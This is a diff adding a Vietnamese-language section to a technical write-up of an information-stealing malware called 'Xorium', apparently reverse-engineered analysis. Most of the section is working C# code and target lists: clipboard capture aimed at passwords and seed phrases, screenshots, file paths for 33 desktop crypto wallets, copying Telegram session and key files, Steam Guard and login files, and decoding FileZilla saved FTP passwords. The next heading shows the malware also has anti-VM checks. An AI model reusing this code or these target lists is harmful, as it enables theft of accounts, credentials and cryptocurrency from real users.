@@ -719,6 +719,249 @@ public static extern IntPtr GetWindowDC(IntPtr hWnd);
 
 ---
 
+## 9.5 CHI TIẾT MODULES ĐẶC BIỆT
+
+### 9.5.1 SystemInfo - Thu thập Thông tin Hệ thống Sâu
+
+**Các thông tin thu thập:**
+
+```csharp
+// 6 sections song song
+Task<string> task1 = Task.Run(() => BuildUserSection());      // User, Machine, HWID, Clipboard
+Task<string> task2 = Task.Run(() => BuildNetworkSection());   // IP, MAC, Adapter
+Task<string> task3 = Task.Run(() => BuildSystemSection());    // OS, CPU, RAM, Uptime
+Task<string> task4 = Task.Run(() => BuildDrivesSection());    // Disk drives info
+Task<string> task5 = Task.Run(() => BuildGpuSection());       // GPU info
+Task<string> task6 = Task.Run(() => BuildBasicSection());     // Basic system info
+```
+
+**HWID Generation:**
+```csharp
+// Kết hợp nhiều yếu tố phần cứng
+values.Add("MG:" + GetMachineGuid());           // Registry MachineGuid
+values.Add("CPU:" + GetCpuName());              // CPU name
+values.Add("Cores:" + Environment.ProcessorCount);
+values.Add("VOLS:" + GetFixedVolumeSerials());  // Volume serial numbers
+values.Add("MACS:" + GetMacAddresses());        // MAC addresses
+values.Add("MN:" + Environment.MachineName);    // Machine name
+
+// SHA256 hash của tất cả
+_hwid = ComputeSha256(string.Join("|", values));
+```
+
+**IP Public Detection:**
+```csharp
+using (WebClient webClient = new WebClient())
+{
+    string ip = webClient.DownloadString("http://icanhazip.com");
+    _cachedIp = ip.Trim();
+}
+```
+
+**Clipboard Extraction:**
+```csharp
+// Lấy nội dung clipboard hiện tại
+string clipboard = GetClipboardTextNoTimeout();
+// Có thể chứa password vừa copy, seed phrase, etc.
+```
+
+### 9.5.2 ScreenShot - Chụp Màn hình với Watermark
+
+**Kỹ thuật chụp màn hình:**
+```csharp
+// Lấy desktop bounds
+Rectangle bounds = Screen.PrimaryScreen.Bounds;
+using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb))
+{
+    using (Graphics graphics = Graphics.FromImage(bitmap))
+    {
+        // BitBlt từ desktop window
+        IntPtr hdc = graphics.GetHdc();
+        IntPtr windowDc = NativeMethods.GetWindowDC(NativeMethods.GetDesktopWindow());
+        NativeMethods.BitBlt(hdc, 0, 0, bounds.Width, bounds.Height, windowDc, 0, 0, 13369376);
+        
+        // Thêm watermark "Xorium" với hiệu ứng gradient
+        using (GraphicsPath path = new GraphicsPath())
+        {
+            path.AddString("Xorium", font.FontFamily, (int)font.Style, font.Size, rectangleF, format);
+            
+            // Gradient brush tím-xanh
+            using (LinearGradientBrush brush = new LinearGradientBrush(
+                rectangleF, 
+                Color.FromArgb(255, 85, 0, 255),   // Tím đậm
+                Color.FromArgb(255, 0, 220, 255),  // Xanh cyan
+                LinearGradientMode.Horizontal))
+            {
+                graphics.FillPath(brush, path);
+            }
+        }
+    }
+}
+```
+
+### 9.5.3 CryptoDesktop - 40+ Ví Tiền điện tử Desktop
+
+**Danh sách đầy đủ ví được hỗ trợ:**
+
+| # | Ví | Đường dẫn | Blockchain |
+|---|-----|-----------|------------|
+| 1 | **Zcash** | `%APPDATA%\Zcash` | ZEC |
+| 2 | **Armory** | `%APPDATA%\Armory` | BTC |
+| 3 | **Bytecoin** | `%APPDATA%\bytecoin` | BCN |
+| 4 | **Jaxx** | `%APPDATA%\com.liberty.jaxx\...` | Multi |
+| 5 | **Exodus** | `%APPDATA%\Exodus\exodus.wallet` | Multi |
+| 6 | **Ethereum** | `%APPDATA%\Ethereum\keystore` | ETH |
+| 7 | **Electrum** | `%APPDATA%\Electrum\wallets` | BTC |
+| 8 | **AtomicWallet** | `%APPDATA%\atomic\Local Storage\...` | Multi |
+| 9 | **Atomic** | `%APPDATA%\Atomic\Local Storage\...` | Multi |
+| 10 | **Guarda** | `%APPDATA%\Guarda\Local Storage\...` | Multi |
+| 11 | **Coinomi** | `%LOCALAPPDATA%\Coinomi\Coinomi\wallets` | Multi |
+| 12 | **Tari** | `%APPDATA%\com.tari.universe\...` | Tari |
+| 13 | **Bitcoin** | `%LOCALAPPDATA%\Bitcoin\wallets` | BTC |
+| 14 | **Dash** | `%APPDATA%\DashCore\wallets` | DASH |
+| 15 | **Litecoin** | `%APPDATA%\Litecoin\wallets` | LTC |
+| 16 | **MyMonero** | `%APPDATA%\MyMonero` | XMR |
+| 17 | **Monero** | `%APPDATA%\Monero` | XMR |
+| 18 | **Vertcoin** | `%APPDATA%\Vertcoin` | VTC |
+| 19 | **Groestlcoin** | `%APPDATA%\Groestlcoin` | GRS |
+| 20 | **Komodo** | `%APPDATA%\Komodo` | KMD |
+| 21 | **PIVX** | `%APPDATA%\PIVX` | PIVX |
+| 22 | **BitcoinGold** | `%APPDATA%\BitcoinGold` | BTG |
+| 23 | **Electrum-LTC** | `%APPDATA%\Electrum-LTC` | LTC |
+| 24 | **Binance** | `%APPDATA%\Binance` | BNB |
+| 25 | **Phantom** | `%APPDATA%\Phantom\IndexedDB\...` | SOL |
+| 26 | **Coin98** | `%APPDATA%\Coin98\IndexedDB\...` | Multi |
+| 27 | **MathWallet** | `%APPDATA%\MathWallet\IndexedDB\...` | Multi |
+| 28 | **LedgerLive** | `%APPDATA%\Ledger Live` | Hardware |
+| 29 | **TrezorSuite** | `%APPDATA%\TrezorSuite` | Hardware |
+| 30 | **MyEtherWallet** | `%APPDATA%\MyEtherWallet` | ETH |
+| 31 | **MyCrypto** | `%APPDATA%\MyCrypto` | ETH |
+| 32 | **MetaMask Desktop** | `%APPDATA%\MetaMask\IndexedDB\...` | ETH |
+| 33 | **TrustWallet Desktop** | `%APPDATA%\TrustWallet\IndexedDB\...` | Multi |
+
+**Registry Wallets (Bitcoin, Litecoin, Dash):**
+```csharp
+// Đọc từ Registry
+string name = $"Software\{sWalletRegistry}\{sWalletRegistry}-Qt";
+string path = Registry.CurrentUser.OpenSubKey(name)?.GetValue("strDataDir")?.ToString();
+string walletPath = Path.Combine(path, "wallets");
+```
+
+### 9.5.4 Telegram - Thu thập Session Data
+
+**Tdata Folder Analysis:**
+```csharp
+// Tìm tất cả folder tdata
+Parallel.ForEach(FindAllMatches("tdata"), tdata =>
+{
+    string targetPath = Path.GetFileName(tdata.Remove(tdata.Length - 6, 6)) + GenerateHashTag();
+    Copydata(tdata, targetPath, zip, counterApplications);
+});
+```
+
+**File Patterns được thu thập:**
+```csharp
+// File session (17 ký tự, kết thúc bằng 's')
+if (name.EndsWith("s") && name.Length == 17)
+    zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
+
+// File cấu hình quan trọng
+if (name.StartsWith("usertag") ||    // User identification
+    name.StartsWith("settings") ||   // App settings
+    name.StartsWith("key_data") ||   // Encryption keys
+    name.StartsWith("configs") ||    // Config data
+    name.StartsWith("maps"))         // Server/map data
+    zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
+```
+
+**Giới hạn kích thước:**
+```csharp
+if (fileInfo.Length > 7120L)  // Bỏ qua file > 7KB
+    return;
+```
+
+### 9.5.5 Steam - Thu thập Game Platform Data
+
+**Registry Analysis:**
+```csharp
+RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\Valve");
+string steamPath = registryKey.GetValue("SteamPath").ToString();
+```
+
+**SSFN Files (Steam Guard):**
+```csharp
+// SSFN = Steam Guard authentication files
+foreach (string file in Directory.GetFiles(steamPath))
+{
+    if (file.Contains("ssfn"))  // Pattern: ssfn[random_numbers]
+    {
+        byte[] content = File.ReadAllBytes(file);
+        zip.AddFile($"Steam\ssfn\{Path.GetFileName(file)}", content);
+    }
+}
+```
+
+**Config Files (VDF format):**
+```csharp
+// Valve Data Format files
+string configPath = Path.Combine(steamPath, "config");
+foreach (string file in Directory.GetFiles(configPath, "*.vdf"))
+{
+    zip.AddFile($"Steam\configs\{Path.GetFileName(file)}", File.ReadAllBytes(file));
+}
+// Bao gồm: loginusers.vdf, config.vdf, steamapps.vdf
+```
+
+**Installed Games List:**
+```csharp
+RegistryKey appsKey = registryKey.OpenSubKey("Apps");
+foreach (string subKeyName in appsKey.GetSubKeyNames())
+{
+    string gameName = registryKey3.GetValue("Name") as string;
+    string installed = ((int?)registryKey3.GetValue("Installed")).GetValueOrDefault() == 1 ? "Yes" : "No";
+    string running = ((int?)registryKey3.GetValue("Running")).GetValueOrDefault() == 1 ? "Yes" : "No";
+    string updating = ((int?)registryKey3.GetValue("Updating")).GetValueOrDefault() == 1 ? "Yes" : "No";
+    // AppID: subKeyName
+}
+```
+
+**AutoLogin Info:**
+```csharp
+string autologinInfo = $@"Autologin User: {registryKey1.GetValue("AutoLoginUser")?.ToString() ?? "Unknown"}
+Remember password: {(((int?)registryKey1.GetValue("RememberPassword")).GetValueOrDefault() == 1 ? "Yes" : "No")}";
+```
+
+### 9.5.6 FileZilla - FTP Password Decryption
+
+**XML Parsing:**
+```csharp
+string[] configFiles = new string[]
+{
+    $"{appdata}\FileZilla\recentservers.xml",
+    $"{appdata}\FileZilla\sitemanager.xml"
+};
+```
+
+**Password Extraction (Base64 Decode):**
+```csharp
+XmlDocument xmlDocument = new XmlDocument();
+xmlDocument.Load(configFile);
+
+foreach (XmlNode xmlNode in xmlDocument.GetElementsByTagName("Server"))
+{
+    string encodedPass = xmlNode?["Pass"]?.InnerText;  // Base64 encoded
+    if (!string.IsNullOrEmpty(encodedPass))
+    {
+        string password = Encoding.UTF8.GetString(Convert.FromBase64String(encodedPass));
+        string url = $"ftp://{xmlNode["Host"]?.InnerText}:{xmlNode["Port"]?.InnerText}/";
+        string username = xmlNode["User"]?.InnerText;
+        // Output: Url, Username, Password
+    }
+}
+```
+
+---
+
 ## 10. KỸ THUẬT ANTI-ANALYSIS
 
 ### 10.1 Anti-VM (8 kiểm tra)
